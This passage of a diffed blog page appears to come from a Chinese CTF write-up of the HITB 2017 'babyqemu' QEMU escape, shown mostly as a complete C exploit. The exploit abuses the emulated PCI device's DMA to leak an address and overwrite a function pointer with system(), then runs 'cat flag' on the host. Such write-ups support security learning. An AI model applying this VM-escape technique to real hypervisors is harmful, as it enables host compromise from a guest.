+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=n>fd</span> <span class=o>==</span> <span class=o>-</span><span class=mi>1</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=nf>die</span><span class=p>(</span><span class=s>&#34;open2&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=kt>uint64_t</span> <span class=n>offset</span> <span class=o>=</span> <span class=n>virt</span> <span class=o>&gt;&gt;</span> <span class=p>(</span><span class=n>PAGE_SHIFT</span><span class=o>-</span><span class=mi>3</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=nf>lseek</span><span class=p>(</span><span class=n>fd</span><span class=p>,</span> <span class=n>offset</span><span class=p>,</span> <span class=n>SEEK_SET</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=kt>uint64_t</span> <span class=n>phys</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=nf>read</span><span class=p>(</span><span class=n>fd</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>phys</span><span class=p>,</span> <span class=mi>8</span><span class=p>)</span> <span class=o>!=</span> <span class=mi>8</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=nf>die</span><span class=p>(</span><span class=s>&#34;read&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=nf>assert</span><span class=p>(</span><span class=n>phys</span> <span class=o>&amp;</span> <span class=p>(</span><span class=mi>1ULL</span> <span class=o>&lt;&lt;</span> <span class=mi>63</span><span class=p>));</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=n>phys</span> <span class=o>=</span> <span class=p>(</span><span class=n>phys</span> <span class=o>&amp;</span> <span class=p>((</span><span class=mi>1ULL</span> <span class=o>&lt;&lt;</span> <span class=mi>54</span><span class=p>)</span> <span class=o>-</span> <span class=mi>1</span><span class=p>))</span> <span class=o>&lt;&lt;</span> <span class=n>PAGE_SHIFT</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>phys</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=kt>void</span> <span class=nf>iowrite</span><span class=p>(</span><span class=kt>uint64_t</span> <span class=n>addr</span><span class=p>,</span> <span class=kt>uint64_t</span> <span class=n>value</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=o>*</span><span class=p>((</span><span class=kt>uint64_t</span> <span class=o>*</span><span class=p>)(</span><span class=n>iomem</span> <span class=o>+</span> <span class=n>addr</span><span class=p>))</span> <span class=o>=</span> <span class=n>value</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=kt>uint64_t</span> <span class=nf>ioread</span><span class=p>(</span><span class=kt>uint64_t</span> <span class=n>addr</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=o>*</span><span class=p>((</span><span class=kt>uint64_t</span> <span class=o>*</span><span class=p>)(</span><span class=n>iomem</span> <span class=o>+</span> <span class=n>addr</span><span class=p>));</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=kt>void</span> <span class=nf>dma_setsrc</span><span class=p>(</span><span class=kt>uint32_t</span> <span class=n>src</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=nf>iowrite</span><span class=p>(</span><span class=mh>0x80</span><span class=p>,</span> <span class=n>src</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=kt>void</span> <span class=nf>dma_setdst</span><span class=p>(</span><span class=kt>uint32_t</span> <span class=n>dst</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=nf>iowrite</span><span class=p>(</span><span class=mh>0x88</span><span class=p>,</span> <span class=n>dst</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=kt>void</span> <span class=nf>dma_setcnt</span><span class=p>(</span><span class=kt>uint32_t</span> <span class=n>cnt</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=nf>iowrite</span><span class=p>(</span><span class=mh>0x90</span><span class=p>,</span> <span class=n>cnt</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=kt>void</span> <span class=nf>dma_setcmd</span><span class=p>(</span><span class=kt>uint32_t</span> <span class=n>cmd</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=nf>iowrite</span><span class=p>(</span><span class=mh>0x98</span><span class=p>,</span> <span class=n>cmd</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=kt>void</span> <span class=nf>dma_read</span><span class=p>(</span><span class=kt>uint64_t</span> <span class=n>addr</span><span class=p>,</span> <span class=kt>size_t</span> <span class=n>len</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=nf>dma_setsrc</span><span class=p>(</span><span class=n>addr</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=nf>dma_setdst</span><span class=p>(</span><span class=n>dmabuf_phys_addr</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=nf>dma_setcnt</span><span class=p>(</span><span class=n>len</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=nf>dma_setcmd</span><span class=p>(</span><span class=mh>0x3</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=nf>sleep</span><span class=p>(</span><span class=mi>1</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=kt>void</span> <span class=nf>dma_write</span><span class=p>(</span><span class=kt>uint64_t</span> <span class=n>addr</span><span class=p>,</span> <span class=kt>void</span> <span class=o>*</span><span class=n>buf</span><span class=p>,</span> <span class=kt>size_t</span> <span class=n>len</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=nf>memcpy</span><span class=p>(</span><span class=n>dmabuf</span><span class=p>,</span> <span class=n>buf</span><span class=p>,</span> <span class=n>len</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=nf>dma_setsrc</span><span class=p>(</span><span class=n>dmabuf_phys_addr</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=nf>dma_setdst</span><span class=p>(</span><span class=n>addr</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=nf>dma_setcnt</span><span class=p>(</span><span class=n>len</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=nf>dma_setcmd</span><span class=p>(</span><span class=mh>0x1</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=nf>sleep</span><span class=p>(</span><span class=mi>1</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=kt>void</span> <span class=nf>dma_enc_read</span><span class=p>(</span><span class=kt>uint64_t</span> <span class=n>addr</span><span class=p>,</span> <span class=kt>size_t</span> <span class=n>len</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=nf>dma_setsrc</span><span class=p>(</span><span class=n>addr</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=nf>dma_setdst</span><span class=p>(</span><span class=n>dmabuf_phys_addr</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=nf>dma_setcnt</span><span class=p>(</span><span class=n>len</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=nf>dma_setcmd</span><span class=p>(</span><span class=mh>0x7</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=nf>sleep</span><span class=p>(</span><span class=mi>1</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=nf>main</span><span class=p>(</span><span class=kt>int</span> <span class=n>argc</span><span class=p>,</span> <span class=kt>char</span> <span class=o>*</span><span class=n>argv</span><span class=p>[])</span>
+</span></span><span class=line><span class=cl><span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=kt>int</span> <span class=n>fd</span> <span class=o>=</span> <span class=nf>open</span><span class=p>(</span><span class=s>&#34;/sys/devices/pci0000:00/0000:00:04.0/resource0&#34;</span><span class=p>,</span> <span class=n>O_RDWR</span><span class=o>|</span><span class=n>O_SYNC</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=n>fd</span> <span class=o>==</span> <span class=o>-</span><span class=mi>1</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=nf>die</span><span class=p>(</span><span class=s>&#34;open&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=n>iomem</span> <span class=o>=</span> <span class=nf>mmap</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mh>0x1000</span><span class=p>,</span> <span class=n>PROT_READ</span><span class=o>|</span><span class=n>PROT_WRITE</span><span class=p>,</span> <span class=n>MAP_SHARED</span><span class=p>,</span> <span class=n>fd</span><span class=p>,</span> <span class=mi>0</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=n>iomem</span> <span class=o>==</span> <span class=n>MAP_FAILED</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=nf>die</span><span class=p>(</span><span class=s>&#34;mmap&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>    <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;iomem          @ %p</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>iomem</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=n>dmabuf</span> <span class=o>=</span> <span class=nf>mmap</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mh>0x1000</span><span class=p>,</span> <span class=n>PROT_READ</span><span class=o>|</span><span class=n>PROT_WRITE</span><span class=p>,</span> <span class=n>MAP_SHARED</span><span class=o>|</span><span class=n>MAP_ANONYMOUS</span><span class=p>,</span> <span class=o>-</span><span class=mi>1</span><span class=p>,</span> <span class=mi>0</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=n>dmabuf</span> <span class=o>==</span> <span class=n>MAP_FAILED</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=nf>die</span><span class=p>(</span><span class=s>&#34;mmap2&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=c1>// lock part or all of the calling process&#39;s virtual address space
+</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>// into RAM, preventing that memory from being paged to the swap area.
+</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=nf>mlock</span><span class=p>(</span><span class=n>dmabuf</span><span class=p>,</span> <span class=mh>0x1000</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=n>dmabuf_phys_addr</span> <span class=o>=</span> <span class=nf>virt2phys</span><span class=p>(</span><span class=n>dmabuf</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;dmabuff        @ %p</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>dmabuf</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;dmabuff(phys)  @ %p</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=p>(</span><span class=kt>void</span> <span class=o>*</span><span class=p>)</span><span class=n>dmabuf_phys_addr</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=nf>fflush</span><span class=p>(</span><span class=n>stdout</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=c1>// leak hitb_enc address
+</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=nf>dma_read</span><span class=p>(</span><span class=n>DMA_BASE</span><span class=o>+</span><span class=mh>0x1000</span><span class=p>,</span> <span class=mi>8</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=kt>uint64_t</span> <span class=n>hitb_enc</span> <span class=o>=</span> <span class=o>*</span><span class=p>((</span><span class=kt>uint64_t</span> <span class=o>*</span><span class=p>)</span><span class=n>dmabuf</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=c1>// calculate the system plt.got address
+</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=kt>uint64_t</span> <span class=n>elf_base</span>      <span class=o>=</span> <span class=n>hitb_enc</span> <span class=o>-</span> <span class=mh>0x283DD0</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=kt>uint64_t</span> <span class=n>system_pltgot</span> <span class=o>=</span> <span class=n>elf_base</span> <span class=o>+</span> <span class=mh>0x1FDB18</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;system@plt.got @ 0x%lx</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>system_pltgot</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=nf>dma_write</span><span class=p>(</span><span class=n>DMA_BASE</span><span class=o>+</span><span class=mh>0x1000</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>system_pltgot</span><span class=p>,</span> <span class=mi>8</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=kt>char</span> <span class=o>*</span><span class=n>payload</span> <span class=o>=</span> <span class=s>&#34;cat flag&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=nf>dma_write</span><span class=p>(</span><span class=n>DMA_BASE</span><span class=o>+</span><span class=mh>0x100</span><span class=p>,</span> <span class=n>payload</span><span class=p>,</span> <span class=nf>strlen</span><span class=p>(</span><span class=n>payload</span><span class=p>));</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=nf>dma_enc_read</span><span class=p>(</span><span class=n>DMA_BASE</span><span class=o>+</span><span class=mh>0x100</span><span class=p>,</span> <span class=mh>0x4</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span></code></pre></td></tr></table></div></div><h2 id=参考>参考</h2><ol><li><a href=https://kitctf.de/writeups/hitb2017/babyqemu>HITB GSEC 2017: babyqemu</a></li><li>[Sakura_University/外卡赛/HITB GSEC 2017 at master · tina2114/Sakura_University ](<a href=https://github.com/tina2114/Sakura_University/tree/master/>https://github.com/tina2114/Sakura_University/tree/master/</a>外卡赛/HITB GSEC 2017) zhz师傅tql</li></ol></div><div class=post-copyright><p class=copyright-item><span class=item-title>文章作者</span>
+<span class=item-content>hhdx</span></p><p class=copyright-item><span class=item-title>上次更新</span>
+<span class=item-content>2020-11-30</span></p></div><footer class=post-footer><div class=post-tags><a href=/tags/qemu/>qemu</a>
+<a href=/tags/ctf/>CTF</a></div><nav class=post-nav><a class=prev href=/post/cve-2015-5165/><i class="iconfont icon-left"></i>
 <span class="prev-text nav-default">QEMU信息泄露漏洞分析与利用----CVE-2015-5165</span>
-<span class="prev-text nav-mobile">上一篇</span>
-</a>
-<a class=next href=/post/virtio-intro/>
-<span class="next-text nav-default">【翻译】Virtio：一种Linux I/O虚拟化框架</span>
+<span class="prev-text nav-mobile">上一篇</span></a>
+<a class=next href=/post/virtio-intro/><span class="next-text nav-default">【翻译】Virtio：一种Linux I/O虚拟化框架</span>
 <span class="next-text nav-mobile">下一篇</span>
-<i class="iconfont icon-right"></i>
-</a>
-</nav>
-</footer>
-</article>
-</div>
-<div id=disqus_thread></div>
-<script type=text/javascript>(function(){var a,b;if(window.location.hostname==='localhost')return;a=document.createElement('script'),a.type='text/javascript',a.async=!0,b='lyliuchao',a.src='//'+b+'.disqus.com/embed.js',(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(a)})()</script>
-<noscript>Please enable JavaScript to view the <a href=http://disqus.com/?ref_noscript>comments powered by Disqus.</a></noscript>
-</div>
-</main>
-<footer id=footer class=footer>
-<div class=social-links>
-<a href=https://github.com/clxsh class="iconfont icon-github" title=github></a>
-<a href=https://www.douban.com/people/57285004/ class="iconfont icon-douban" title=douban></a>
-<a href=https://hhdx.xyz/index.xml type=application/rss+xml class="iconfont icon-rss" title=rss></a>
-</div>
-<div class=copyright>
-<span class=power-by>
-由 <a class=hexo-link href=https://gohugo.io>Hugo</a> 强力驱动
-</span>
+<i class="iconfont icon-right"></i></a></nav></footer></article></div><div id=disqus_thread></div><script type=text/javascript>(function(){if(window.location.hostname==="localhost")return;var t,e=document.createElement("script");e.type="text/javascript",e.async=!0,t="lyliuchao",e.src="//"+t+".disqus.com/embed.js",(document.getElementsByTagName("head")[0]||document.getElementsByTagName("body")[0]).appendChild(e)})()</script><noscript>Please enable JavaScript to view the <a href=http://disqus.com/?ref_noscript>comments powered by Disqus.</a></noscript></div></main><footer id=footer class=footer><div class=social-links><a href=https://github.com/clxsh class="iconfont icon-github" title=github></a>
+<a href=https://www.douban.com/people/57285004/ class="iconfont icon-douban" title=douban></a></div><div class=copyright><span class=power-by>由 <a class=hexo-link href=https://gohugo.io>Hugo</a> 强力驱动</span>
 <span class=division>|</span>
-<span class=theme-info>
-主题 -
-<a class=theme-link href=https://github.com/olOwOlo/hugo-theme-even>Even</a>
-</span>
-<span class=copyright-year>
-&copy;
+<span class=theme-info>主题 -
+<a class=theme-link href=https://github.com/olOwOlo/hugo-theme-even>Even</a></span>
+<span class=copyright-year>&copy;
 2016 -
-2021<span class=heart><i class="iconfont icon-heart"></i></span><span>hhdx</span>
-</span>
-</div>
-</footer>
-<div class=back-to-top id=back-to-top>
-<i class="iconfont icon-up"></i>
-</div>
-</div>
-<script src=https://cdn.jsdelivr.net/npm/jquery@3.2.1/dist/jquery.min.js integrity="sha256-hwg4gsxgFZhOsEEamdOYGBf13FyQuiTwlAQgxVSNgt4=" crossorigin=anonymous></script>
+2023<span class=heart><i class="iconfont icon-heart"></i></span><span>hhdx</span></span></div></footer><div class=back-to-top id=back-to-top><i class="iconfont icon-up"></i></div></div><script src=https://cdn.jsdelivr.net/npm/jquery@3.7.0/dist/jquery.min.js integrity=sha384-NXgwF8Kv9SSAr+jemKKcbvQsz+teULH/a5UNJvZc6kP47hZgl62M1vGnw6gHQhb1 crossorigin=anonymous></script>
 <script src=https://cdn.jsdelivr.net/npm/slideout@1.0.1/dist/slideout.min.js integrity="sha256-t+zJ/g8/KXIJMjSVQdnibt4dlaDxc9zXr/9oNPeWqdg=" crossorigin=anonymous></script>
 <script src=https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.1.20/dist/jquery.fancybox.min.js integrity="sha256-XVLffZaxoWfGUEbdzuLi7pwaUJv1cecsQJQqGLe7axY=" crossorigin=anonymous></script>
-<script type=text/javascript src=/js/main.min.c99b103c33d1539acf3025e1913697534542c4a5aa5af0ccc20475ed2863603b.js></script>
-<script type=application/javascript>var doNotTrack=!1;doNotTrack||(window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)},ga.l=+new Date,ga('create','UA-177325662-1','auto'),ga('set','anonymizeIp',!0),ga('send','pageview'))</script>
-<script async src=https://www.google-analytics.com/analytics.js></script>
-</body>
-</html>
+<script type=text/javascript src=/js/main.min.4ae89da218555efa0e7093a20b92017d2e1202b66fff9fc2edf4cb8d44b44c6e.js></script>
+<script type=application/javascript>var doNotTrack=!1;doNotTrack||(window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)},ga.l=+new Date,ga("create","UA-177325662-1","auto"),ga("set","anonymizeIp",!0),ga("send","pageview"))</script><script async src=https://www.google-analytics.com/analytics.js></script></body></html>
